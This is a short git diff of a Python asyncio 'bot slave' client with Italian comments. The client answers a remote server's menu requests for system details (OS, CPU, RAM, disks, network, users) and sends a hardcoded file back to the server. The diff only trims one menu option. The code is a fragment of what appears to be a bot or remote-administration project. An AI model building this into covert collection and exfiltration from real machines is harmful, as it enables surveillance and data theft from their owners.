@@ -12,7 +12,7 @@ from . import bot_slave_utilities as bot_utils
 # from functools import partial  # Per comodità leggiamo il file da inviare in chunk di dati
 
 __response_options = {"1": "OS-TYPE", "2": "CPU-STATS", "3": "RAM", "4": "PARTITION-DISK-INFO", "5": "PARTITION-DISK-STATUS",
-                      "6": "IO-CONNECTED", "7": "NETWORK-INFO", "8": "USERS", "9": "DOWNLOAD-FILE", "10": "Content-Path", "q": "QUIT"}
+                      "6": "NETWORK-INFO", "7": "USERS", "8": "DOWNLOAD-FILE", "9": "Content-Path", "q": "QUIT"}
 
 __buffer_size = 8192
 
@@ -46,6 +46,7 @@ async def command_to_execute(writer: asyncio.StreamWriter, case: str) -> None:
             # TODO: Spostare la funzione a parte e gestire la richiesta del file con un dictionary una volta listato il contenuto (?)
             request = "test.png"  # Atm il file è hardcoded -> In questo punto facciamo stripping della request ricevuta dal server e controlliamo se esiste sul disco il file richiesto
             await bot_utils.send_file(request, __buffer_size, writer)  # Spostiamo la gestione del controllo di esistenza del file all'interno della funzione stessa
+
         case _:
             return "NULL"
 
